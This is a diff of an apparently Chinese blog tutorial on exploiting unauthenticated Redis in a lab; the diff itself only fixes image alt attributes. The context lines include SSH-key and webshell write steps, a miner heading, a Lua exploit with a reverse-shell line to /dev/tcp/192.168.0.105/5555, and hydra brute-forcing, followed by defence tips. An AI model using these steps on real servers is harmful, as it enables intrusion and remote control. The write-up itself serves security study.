@@ -518,7 +518,7 @@
 <span class="token function">cd</span> <span class="token punctuation">..</span>
 <span class="token function">cp</span> redis.conf /etc/
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>3.修改<code>redis.conf</code>, 开启外部访问，关闭保护模式(保护模式下运行redis是利用不成功滴)<br><img src="/posts/6/20200525210801776_1038672757.png" alt></p>
+<p>3.修改<code>redis.conf</code>, 开启外部访问，关闭保护模式(保护模式下运行redis是利用不成功滴)<br><img src="/posts/6/20200525210801776_1038672757.png" alt=""></p>
 <p>4.启动redis服务</p>
 <pre class="line-numbers language-bash"><code class="language-bash">redis-server  /etc/redis.conf
 
@@ -593,7 +593,7 @@ save
 <span class="token comment" spellcheck="true"># 然后本机直接连接目标</span>
 <span class="token function">ssh</span>  -o StrictHostKeyChecking<span class="token operator">=</span>no 192.168.0.100
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>同时也要注意系统的乱码问题<br><img src="/posts/6/20200525224703847_1050926657.png" alt></p>
+<p>同时也要注意系统的乱码问题<br><img src="/posts/6/20200525224703847_1050926657.png" alt=""></p>
 <h6 id="3-低权限写入WebShell"><a href="#3-低权限写入WebShell" class="headerlink" title="3.低权限写入WebShell"></a>3.低权限写入WebShell</h6><blockquote>
 <p>需要知道网站路径</p>
 </blockquote>
@@ -604,7 +604,7 @@ save
 
 <span class="token comment" spellcheck="true"># 访问webshell</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/posts/6/20200525222440751_1498038879.png" alt></p>
+<p><img src="/posts/6/20200525222440751_1498038879.png" alt=""></p>
 <h6 id="4-开机自启目录"><a href="#4-开机自启目录" class="headerlink" title="4.开机自启目录"></a>4.开机自启目录</h6><blockquote>
 <p>前提：redis部署在windows主机上</p>
 </blockquote>
@@ -626,7 +626,7 @@ save
 <h6 id="5-写入挖矿进程"><a href="#5-写入挖矿进程" class="headerlink" title="5.写入挖矿进程"></a>5.写入挖矿进程</h6><h6 id="nmap检测"><a href="#nmap检测" class="headerlink" title="nmap检测"></a>nmap检测</h6><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 6379 --script redis-info 192.168.0.100
 <span class="token comment" spellcheck="true">#地址:https://svn.nmap.org/nmap/scripts/redis-info.nse</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="/posts/6/20200525225557672_1832619508.png" alt></p>
+<p><img src="/posts/6/20200525225557672_1832619508.png" alt=""></p>
 <h6 id="安全检查"><a href="#安全检查" class="headerlink" title="安全检查"></a>安全检查</h6><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#1.查看redis运行的用户权限</span>
 <span class="token function">ps</span> -aux <span class="token operator">|</span><span class="token function">grep</span> redis
 
@@ -666,7 +666,7 @@ jdk：首先看 value 是不是 base64，如果是解码后看里面有没有 ja
 <p>使用<code>info server</code> 和 <code>eval “return _VERSION” 0</code>命令可以查看当前redis版本和编译信息。</p>
 <p>exp</p>
 <pre><code>https://github.com/QAX-A-Team/redis_lua_exploit/
-</code></pre><p>修改<code>redis_lua.py</code>中目标地址为靶机的地址和端口<br><img src="/posts/6/20200526092701919_308935847.png" alt></p>
+</code></pre><p>修改<code>redis_lua.py</code>中目标地址为靶机的地址和端口<br><img src="/posts/6/20200526092701919_308935847.png" alt=""></p>
 <p>运行exp</p>
 <p>执行成功后就可以进行命令执行了，这里反弹shell</p>
 <pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">eval</span> <span class="token string">"tonumber('/bin/bash -i >&amp; /dev/tcp/192.168.0.105/5555 0>&amp;1', 8)"</span> 0
@@ -682,12 +682,12 @@ jdk：首先看 value 是不是 base64，如果是解码后看里面有没有 ja
 <span class="token keyword">set</span> pass_file xxxxxxx.txt
 run
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/posts/6/20200526094633220_1454687311.png" alt></p>
+<p><img src="/posts/6/20200526094633220_1454687311.png" alt=""></p>
 <p>3.hydra</p>
 <pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 还是hydra好用，速度还快</span>
 hydra -P redis_pass.txt redis://192.168.0.100
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="/posts/6/20200526095113424_1824777352.png" alt></p>
+<p><img src="/posts/6/20200526095113424_1824777352.png" alt=""></p>
 <h2 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h2><ul>
 <li>禁止root运行redis</li>
 <li>设置账户密码认证</li>
